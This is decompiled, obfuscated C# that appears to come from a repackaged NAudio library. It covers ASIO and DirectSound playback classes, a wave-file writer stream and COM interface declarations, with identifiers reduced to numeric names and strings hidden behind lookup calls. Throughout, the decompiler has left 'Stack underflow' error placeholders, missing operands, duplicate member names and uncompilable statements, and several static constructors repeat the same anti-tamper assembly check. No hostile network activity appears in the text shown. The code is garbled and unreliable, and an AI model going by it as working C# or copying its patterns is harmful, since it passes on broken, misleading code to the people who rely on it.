		public int DriverInputChannelCount => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001._0001;

		public int DriverOutputChannelCount => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001._0001._0002;

		public int ChannelOffset
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0004;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/).m__0004 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int InputChannelOffset
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0003)/*Error near IL_0007: Stack underflow*/).m__0005;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0003)/*Error near IL_0009: Stack underflow*/).m__0005 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		[Obsolete("this function will be removed in a future NAudio as ASIO does not support setting the volume on the device")]
		public float Volume
		{
			get
			{
				return 1f;
			}
			set
			{
				//IL_0007: Invalid comparison between Unknown and F4
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_0023: Incompatible stack heights: 0 vs 1
				if ((float)/*Error near IL_0009: Stack underflow*/ != 1f)
				{
					_0080._0014._0001(107389329);
					new InvalidOperationException((string?)/*Error near IL_0023: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
			}
		}

		public event EventHandler<global::_0003._0003> PlaybackStopped
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public event EventHandler<global::_0002._0006> AudioAvailable
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0002._0006> eventHandler = ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler<global::_0002._0006> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0002._0006>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0002._0006> value2 = (EventHandler<global::_0002._0006>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0002._0006> eventHandler = ((_0003)/*Error near IL_0007: Stack underflow*/).m__0001;
				EventHandler<global::_0002._0006> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0002._0006>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0002._0006> value2 = (EventHandler<global::_0002._0006>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this.m__0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0003()
			: this(0)
		{
		}

		public _0003(string _0097_008F_0006)
		{
			this._0001 = SynchronizationContext.Current;
			global::_0011._0018._0001(this, _0097_008F_0006);
		}

		public _0003(int _0098_008F_0006)
		{
			this._0001 = SynchronizationContext.Current;
			string[] array = global::_0011._0018._0001();
			if (array.Length == 0)
			{
				throw new ArgumentException(_0080._0014._0001(107388951));
			}
			if (_0098_008F_0006 < 0 || _0098_008F_0006 > array.Length)
			{
				throw new ArgumentException(string.Format(_0080._0014._0001(107389398), array.Length));
			}
			this.m__0001 = array[_0098_008F_0006];
			global::_0011._0018._0001(this, this.m__0001);
		}

		protected override void _0004()
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			try
			{
				((_0003)/*Error near IL_000e: Stack underflow*/)._0005();
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		public void _0005()
		{
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 1
			if (((_0003)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				if (((_0003)/*Error near IL_0010: Stack underflow*/).m__0001 != 0)
				{
					global::_0011._0018._0001(((_0003)/*Error near IL_0019: Stack underflow*/)._0001);
				}
				global::_0011._0018._0001(this._0001);
				this._0001 = null;
			}
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0005();
		}

		public void _0001()
		{
			//IL_0020: Incompatible stack heights: 0 vs 1
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_0026: Incompatible stack heights: 0 vs 1
			if (((_0003)/*Error near IL_0007: Stack underflow*/).m__0001 != global::_001C._0005._0002)
			{
				((_0003)/*Error near IL_0012: Stack underflow*/).m__0001 = global::_001C._0005._0002;
				global::_0011._0018._0001(((_0003)/*Error near IL_0019: Stack underflow*/)._0001);
			}
		}

		public void _0002()
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			((_0003)/*Error near IL_0008: Stack underflow*/).m__0001 = global::_001C._0005._0001;
			global::_0011._0018._0001(((_0003)/*Error near IL_000f: Stack underflow*/)._0001);
			global::_0011._0018._0001((Exception)null, this);
		}

		public void _0003()
		{
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			((_0003)/*Error near IL_0008: Stack underflow*/).m__0001 = global::_001C._0005._0003;
			global::_0011._0018._0001(((_0003)/*Error near IL_000f: Stack underflow*/)._0001);
		}

		public void _0001(global::_001C._0004 _0002)
		{
			//IL_000a: Incompatible stack heights: 0 vs 2
			//IL_000d: Incompatible stack heights: 0 vs 2
			_ = -1;
			_ = 0;
			global::_0011._0018._0001((int)/*Error near IL_0014: Stack underflow*/, (_0003)/*Error near IL_0014: Stack underflow*/, (int)/*Error near IL_0014: Stack underflow*/, (global::_001C._0004)/*Error near IL_0014: Stack underflow*/);
		}

		internal unsafe void _0001(IntPtr[] _0002, IntPtr[] _0003)
		{
			//IL_000b: Invalid comparison between Unknown and I4
			//IL_00bc: Incompatible stack heights: 0 vs 1
			//IL_00c6: Incompatible stack heights: 0 vs 1
			//IL_00cc: Incompatible stack heights: 0 vs 1
			_ = ((_0003)/*Error near IL_00c6: Stack underflow*/).NumberOfInputChannels;
			if ((int)/*Error near IL_000d: Stack underflow*/ > 0)
			{
				EventHandler<global::_0002._0006> eventHandler = ((_0003)/*Error near IL_0017: Stack underflow*/).m__0001;
				if (eventHandler != null)
				{
					global::_0002._0006 obj = new global::_0002._0006(_0002, _0003, this._0001, this._0001._0001._0001[0]._0001);
					eventHandler(this, obj);
					if (obj.WrittenToOutputBuffers)
					{
						return;
					}
				}
			}
			if (NumberOfOutputChannels > 0)
			{
				int num = this._0001.Read(this._0001, 0, this._0001.Length);
				_ = this._0001.Length;
				fixed (IntPtr* value = &System.Runtime.CompilerServices.Unsafe.As<byte, IntPtr>(ref this._0001[0]))
				{
					this._0001(new IntPtr(value), _0003, NumberOfOutputChannels, this._0001);
				}
				if (num == 0)
				{
					this._0002();
				}
			}
		}
	}
}
namespace _0010
{
	internal interface _0006 : IDisposable
	{
		global::_001C._0005 PlaybackState { get; }

		[Obsolete("Not intending to keep supporting this going forward: set the volume on your input WaveProvider instead")]
		float Volume { get; set; }

		event EventHandler<global::_0003._0003> PlaybackStopped;

		void _0001();

		void _0002();

		void _0003();

		void _0001(global::_001C._0004 _0002);
	}
}
namespace _0006
{
	internal sealed class _0004 : global::_001A._0005
	{
		internal new global::_0005._0007 _0001;

		public _0004(string _0089_0015, global::_0005._0005 _0099_008F_0006)
			: base(_0089_0015, _0099_008F_0006)
		{
		}

		protected override void _0001(BinaryWriter _0002)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0012: Incompatible stack heights: 0 vs 1
			((global::_001A._0005)/*Error near IL_0019: Stack underflow*/)._0001((BinaryWriter)/*Error near IL_0019: Stack underflow*/);
			global::_0011._0018._0001(this, _0002);
		}

		static _0004()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _001A
{
	internal class _0005 : Stream
	{
		internal Stream _0001;

		internal readonly BinaryWriter _0001;

		internal long _0001;

		internal long _0002;

		internal long _0003;

		internal readonly global::_0005._0005 _0001;

		private readonly string m__0001;

		internal readonly byte[] _0001 = new byte[3];

		public string Filename => ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;

		public override long Length => ((_0005)/*Error near IL_0007: Stack underflow*/)._0003;

		public global::_0005._0005 WaveFormat => ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;

		public override bool CanRead => false;

		public override bool CanWrite => true;

		public override bool CanSeek => false;

		public override long Position
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/)._0003;
			}
			set
			{
				//IL_000f: Incompatible stack heights: 0 vs 1
				//IL_0016: Incompatible stack heights: 0 vs 1
				_0080._0014._0001(107388395);
				new InvalidOperationException((string?)/*Error near IL_0016: Stack underflow*/);
				throw /*Error near IL_000a: Stack underflow*/;
			}
		}

		public _0005(Stream _0087_0086, global::_0005._0005 _0086_0086)
		{
			this._0001 = _0087_0086;
			this._0001 = _0086_0086;
			this._0001 = new BinaryWriter(_0087_0086, Encoding.UTF8);
			this._0001.Write(Encoding.UTF8.GetBytes(_0080._0014._0001(107393181)));
			this._0001.Write(0);
			this._0001.Write(Encoding.UTF8.GetBytes(_0080._0014._0001(107388080)));
			this._0001.Write(Encoding.UTF8.GetBytes(_0080._0014._0001(107388039)));
			_0086_0086._0001(this._0001);
			global::_0011._0018._0001(this);
			global::_0011._0018._0001(this);
		}

		public _0005(string _0096_0093, global::_0005._0005 _0086_0086)
			: this(new FileStream(_0096_0093, FileMode.Create, FileAccess.Write, FileShare.Read), _0086_0086)
		{
			this.m__0001 = _0096_0093;
		}

		public override int Read(byte[] buffer, int offset, int count)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107388062);
			new InvalidOperationException((string?)/*Error near IL_0016: Stack underflow*/);
			throw /*Error near IL_000a: Stack underflow*/;
		}

		public override long Seek(long offset, SeekOrigin origin)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107388017);
			new InvalidOperationException((string?)/*Error near IL_0016: Stack underflow*/);
			throw /*Error near IL_000a: Stack underflow*/;
		}

		public override void SetLength(long value)
		{
			//IL_000f: Incompatible stack heights: 0 vs 1
			//IL_0016: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107387936);
			new InvalidOperationException((string?)/*Error near IL_0016: Stack underflow*/);
			throw /*Error near IL_000a: Stack underflow*/;
		}

		[Obsolete("Use Write instead")]
		public void _0001(byte[] _0002, int _0003, int _0004)
		{
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0019: Incompatible stack heights: 0 vs 1
			_ = _0083._007E_0008_0004;
			/*Error near IL_0011: Stack underflow*/((object)/*Error near IL_0011: Stack underflow*/, (byte[])/*Error near IL_0011: Stack underflow*/, (int)/*Error near IL_0011: Stack underflow*/, _0004);
		}

		public override void Write(byte[] data, int offset, int count)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Invalid comparison between Unknown and I8
			//IL_0054: Incompatible stack heights: 0 vs 2
			//IL_005b: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 1
			_ = global::_0012._007E_0090_0002;
			Stream stream = ((_0005)/*Error near IL_000c: Stack underflow*/)._0001;
			/*Error near IL_005b: Stack underflow*/(stream);
			long num = (long)/*Error near IL_0011: Stack underflow*/;
			if (/*Error near IL_0012: Stack underflow*/ + num > 4294967295L)
			{
				throw new ArgumentException(_0080._0014._0001(107388330), _0080._0014._0001(107388337));
			}
			_0083._007E_0008_0004(this._0001, data, offset, count);
			_0003 += count;
		}

		[Obsolete("Use WriteSamples instead")]
		public void _0001(short[] _0002, int _0003, int _0004)
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			//IL_0011: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((int)/*Error near IL_000c: Stack underflow*/, (short[])/*Error near IL_000c: Stack underflow*/, (int)/*Error near IL_000c: Stack underflow*/, this);
		}

		public override void Flush()
		{
			//IL_003f: Incompatible stack heights: 0 vs 3
			//IL_0046: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			_ = global::_0012._007E_0091_0002;
			_ = _0005_0003._007E_0081_0006;
			BinaryWriter binaryWriter = ((_0005)/*Error near IL_0011: Stack underflow*/)._0001;
			/*Error near IL_0046: Stack underflow*/(binaryWriter);
			/*Error near IL_004d: Stack underflow*/((object)/*Error near IL_004d: Stack underflow*/);
			long num = (long)/*Error near IL_0016: Stack underflow*/;
			_0001(this._0001);
			_007F_0002._007E_0083_0005(_0005_0003._007E_0081_0006(this._0001), num);
		}

		protected override void Dispose(bool disposing)
		{
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0004: Stack underflow*/ != 0 && ((_0005)/*Error near IL_000b: Stack underflow*/)._0001 != null)
			{
				try
				{
					BinaryWriter binaryWriter = this._0001;
					((_0005)/*Error near IL_001a: Stack underflow*/)._0001(binaryWriter);
				}
				finally
				{
					global::_0008._007E_0099(this._0001);
					this._0001 = null;
				}
			}
		}

		protected virtual void _0001(BinaryWriter _0002)
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_002b: Incompatible stack heights: 0 vs 1
			_ = global::_0008._007E_009F;
			/*Error near IL_0028: Stack underflow*/((object)/*Error near IL_0028: Stack underflow*/);
			global::_0011._0018._0001((BinaryWriter)/*Error near IL_0011: Stack underflow*/, this);
			global::_0011._0018._0001(_0002, this);
			global::_0011._0018._0001(this, _0002);
		}

		~_0005()
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			try
			{
				_ = global::_0005._007E_008A;
				/*Error near IL_0014: Stack underflow*/((object)/*Error near IL_0014: Stack underflow*/, false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		static _0005()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0003
{
	internal sealed class _0003 : EventArgs
	{
		private readonly Exception _0001;

		public Exception Exception => ((_0003)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0003(Exception _000F_008E_0003 = null)
		{
			_0001 = _000F_008E_0003;
		}

		static _0003()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(_0080._0014._0001(107396706));
		}
	}
}
namespace _0016
{
	internal interface _0006
	{
		byte[] ByteBuffer { get; }

		float[] FloatBuffer { get; }

		short[] ShortBuffer { get; }

		int[] IntBuffer { get; }

		int MaxSize { get; }

		int ByteBufferCount { get; }

		int FloatBufferCount { get; }

		int ShortBufferCount { get; }

		int IntBufferCount { get; }
	}
}
namespace _001F
{
	internal interface _0006
	{
		global::_0005._0005 OutputWaveFormat { get; }

		long _0001();
	}
}
namespace _001C
{
	internal interface _0004
	{
		global::_0005._0005 WaveFormat { get; }

		int Read(byte[] buffer, int offset, int count);
	}
}
namespace _000E
{
	internal sealed class _0008 : IDisposable, global::_0010._0006
	{
		[StructLayout(LayoutKind.Sequential, Pack = 2)]
		internal sealed class _0001
		{
			public int _0001;

			[MarshalAs(UnmanagedType.U4)]
			public _0007 _0001;

			public uint _0001;

			public int _0002;

			public IntPtr _0001;

			public Guid _0001;
		}

		[StructLayout(LayoutKind.Sequential, Pack = 2)]
		internal sealed class _0002
		{
			public int _0001;

			public int _0002;

			public int _0003;

			public int _0004;

			public int _0005;

			static _0002()
			{
				//IL_00bb: Incompatible stack heights: 0 vs 1
				bool flag = false;
				global::_0001._0001();
				Assembly assembly;
				if (true)
				{
					assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
				}
				Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
				if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
				{
					return;
				}
				throw new SecurityException(_0080._0014._0001(107396706));
			}
		}

		internal enum _0003 : uint
		{
			_0001 = 1u,
			_0002,
			_0003,
			_0004
		}

		[Flags]
		internal enum _0004 : uint
		{
			_0001 = 1u,
			_0002 = 2u,
			_0003 = 4u,
			_0004 = 8u,
			_0005 = 0x10u,
			_0006 = 0x20u
		}

		internal enum _0005 : uint
		{
			_0001,
			_0002,
			_0003
		}

		[Flags]
		internal enum _0006 : uint
		{
			_0001 = 1u,
			_0002 = 2u,
			_0003 = 4u,
			_0004 = 8u,
			_0005 = 0x10u,
			_0006 = 0x20u
		}

		[Flags]
		internal enum _0007 : uint
		{
			_0001 = 1u,
			_0002 = 2u,
			_0003 = 4u,
			_0004 = 8u,
			_0005 = 0x10u,
			_0006 = 0x20u,
			_0007 = 0x40u,
			_0008 = 0x80u,
			_000E = 0x100u,
			_000F = 0x200u,
			_0010 = 0x4000u,
			_0011 = 0x8000u,
			_0012 = 0x10000u,
			_0013 = 0x20000u,
			_0014 = 0x40000u
		}

		internal struct _0008
		{
			public uint _0001;

			public IntPtr _0001;
		}

		[ComImport]
		[Guid("279AFA83-4981-11CE-A521-0020AF0BE560")]
		[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
		[SuppressUnmanagedCodeSecurity]
		internal interface _000E
		{
			void _0001([In] _0001 _0002, [MarshalAs(UnmanagedType.Interface)] out object _0003, IntPtr _0004);

			void _0001(IntPtr _0002);

			void _0001([In][MarshalAs(UnmanagedType.Interface)] _000F _0002, [In][MarshalAs(UnmanagedType.Interface)] _000F _0003);

			void _0001(IntPtr _0002, [In][MarshalAs(UnmanagedType.U4)] _0003 _0003);

			void _0001();

			void _0002(IntPtr _0002);

			void _0001(uint _0002);

			void _0001([In][MarshalAs(UnmanagedType.LPStruct)] Guid _0002);
		}

		[ComImport]
		[Guid("279AFA85-4981-11CE-A521-0020AF0BE560")]
		[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
		[SuppressUnmanagedCodeSecurity]
		internal interface _000F
		{
			void _0001([MarshalAs(UnmanagedType.LPStruct)] _0002 _0002);

			void _0001(out uint _0002, out uint _0003);

			void _0001();

			[return: MarshalAs(UnmanagedType.I4)]
			int _0001();

			void _0001(out uint _0002);

			[return: MarshalAs(UnmanagedType.I4)]
			int _0002();

			[return: MarshalAs(UnmanagedType.U4)]
			_0006 _0001();

			void _0001([In][MarshalAs(UnmanagedType.Interface)] _000E _0002, [In] _0001 _0003);

			void _0001(int _0002, uint _0003, out IntPtr _0004, out int _0005, out IntPtr _0006, out int _0007, [MarshalAs(UnmanagedType.U4)] _0005 _0008);

			void _0001(uint _0002, uint _0003, [In][MarshalAs(UnmanagedType.U4)] _0004 _0004);

			void _0001(uint _0002);

			void _0001([In] global::_0005._0005 _0002);

			void _0001(int _0002);

			void _0002(uint _0002);

			void _0003(uint _0002);

			void _0002();

			void _0001(IntPtr _0002, int _0003, IntPtr _0004, int _0005);

			void _0003();
		}

		[ComImport]
		[Guid("b0210783-89cd-11d0-af08-00a0c925cd16")]
		[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
		[SuppressUnmanagedCodeSecurity]
		internal interface _0010
		{
			void _0001(uint _0002, [In][MarshalAs(UnmanagedType.LPArray)] _0008[] _0003);
		}

		internal delegate bool _0011(IntPtr lpGuid, IntPtr lpcstrDescription, IntPtr lpcstrModule, IntPtr lpContext);

		[CompilerGenerated]
		internal sealed class _0012
		{
			public EventHandler<global::_0003._0003> _0001;

			public Exception _0001;

			public global::_000E._0008 _0001;

			internal void _0001(object _0002)
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((_0012)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_0012)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((_0012)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}
		}

		[CompilerGenerated]
		internal EventHandler<global::_0003._0003> _0001;

		internal global::_001C._0005 _0001;

		internal global::_0005._0005 _0001;

		internal int _0001;

		internal int _0002;

		internal int _0003;

		internal int _0004;

		internal Guid _0001;

		internal byte[] _0001;

		internal global::_001C._0004 _0001;

		internal _000E _0001;

		internal _000F _0001;

		internal _000F _0002;

		internal EventWaitHandle _0001;

		internal EventWaitHandle _0002;

		internal EventWaitHandle _0003;

		private Thread m__0001;

		internal SynchronizationContext _0001;

		internal long _0001;

		internal object _0001 = new object();

		internal static List<global::_001A._0004> _0001;

		public static readonly Guid _0002;

		public static readonly Guid _0003;

		public static readonly Guid _0004;

		public static readonly Guid _0005;

		public static IEnumerable<global::_001A._0004> Devices
		{
			get
			{
				//IL_0025: Incompatible stack heights: 0 vs 1
				new List<global::_001A._0004>();
				global::_000E._0008._0001 = (List<global::_001A._0004>)/*Error near IL_0007: Stack underflow*/;
				global::_0011._0018._0001((_0011)global::_0011._0018._0001, IntPtr.Zero);
				return global::_000E._0008._0001;
			}
		}

		public TimeSpan PlaybackPosition
		{
			get
			{
				//IL_0024: Unknown result type (might be due to invalid IL or missing references)
				//IL_0044: Incompatible stack heights: 0 vs 2
				//IL_004b: Incompatible stack heights: 0 vs 1
				//IL_004e: Incompatible stack heights: 0 vs 1
				_ = _0003_0003._001F_0006;
				global::_0011._0018._0001((global::_000E._0008)/*Error near IL_004b: Stack underflow*/);
				int num = ((global::_000E._0008)/*Error near IL_0010: Stack underflow*/)._0001._0001 * this._0001._0003 / 8;
				double num2 = (double)(/*Error near IL_0025: Stack underflow*/ / num) * 1000.0 / (double)this._0001._0001;
				return /*Error near IL_0042: Stack underflow*/(num2);
			}
		}

		public global::_001C._0005 PlaybackState => ((global::_000E._0008)/*Error near IL_0007: Stack underflow*/)._0001;

		public float Volume
		{
			get
			{
				return 1f;
			}
			set
			{
				//IL_0007: Invalid comparison between Unknown and F4
				//IL_0015: Incompatible stack heights: 0 vs 1
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_0023: Incompatible stack heights: 0 vs 1
				if ((float)/*Error near IL_0009: Stack underflow*/ != 1f)
				{
					_0080._0014._0001(107389239);
					new InvalidOperationException((string?)/*Error near IL_0023: Stack underflow*/);
					throw /*Error near IL_0013: Stack underflow*/;
				}
			}
		}

		public event EventHandler<global::_0003._0003> PlaybackStopped
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((global::_000E._0008)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((global::_000E._0008)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0008()
			: this(global::_000E._0008._0002)
		{
		}

		public _0008(Guid _009A_008F_0006)
			: this(_009A_008F_0006, 40)
		{
		}

		public _0008(int _009B_008F_0006)
			: this(global::_000E._0008._0002, _009B_008F_0006)
		{
		}

		public _0008(Guid _009A_008F_0006, int _009B_008F_0006)
		{
			if (_009A_008F_0006 == Guid.Empty)
			{
				_009A_008F_0006 = global::_000E._0008._0002;
			}
			this._0001 = _009A_008F_0006;
			this._0004 = _009B_008F_0006;
			this._0001 = SynchronizationContext.Current;
		}

		protected override void _0004()
		{
			//IL_0007: Incompatible stack heights: 0 vs 1
			try
			{
				((global::_000E._0008)/*Error near IL_000e: Stack underflow*/)._0005();
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		public void _0001()
		{
			//IL_007d: Incompatible stack heights: 0 vs 1
			//IL_0083: Incompatible stack heights: 0 vs 1
			//IL_0089: Incompatible stack heights: 0 vs 1
			if (((global::_000E._0008)/*Error near IL_0007: Stack underflow*/)._0001 == global::_001C._0005._0001)
			{
				Thread thread = new Thread(_0006);
				((global::_000E._0008)/*Error near IL_0022: Stack underflow*/).m__0001 = thread;
				_0001_0003._007E_001D_0006(this.m__0001, ThreadPriority.Normal);
				global::_0005._007E_008B(this.m__0001, true);
				global::_0008._007E_0002_0002(this.m__0001);
			}
			object obj = this._0001;
			_0091_0002._009C_0005(obj);
			try
			{
				this._0001 = global::_001C._0005._0002;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		public void _0002()
		{
			//IL_004c: Incompatible stack heights: 0 vs 2
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			_ = _0002_0003._001E_0006;
			object obj = ((global::_000E._0008)/*Error near IL_000c: Stack underflow*/)._0001;
			/*Error near IL_0053: Stack underflow*/(obj, 50);
			if ((int)/*Error near IL_0012: Stack underflow*/ != 0)
			{
				((global::_000E._0008)/*Error near IL_001a: Stack underflow*/)._0001 = global::_001C._0005._0001;
				_0091_0002._009D_0005(this._0001);
			}
			else if (this.m__0001 != null)
			{
				global::_0008._007E_0003_0002(this.m__0001);
				this.m__0001 = null;
			}
		}

		public void _0003()
		{
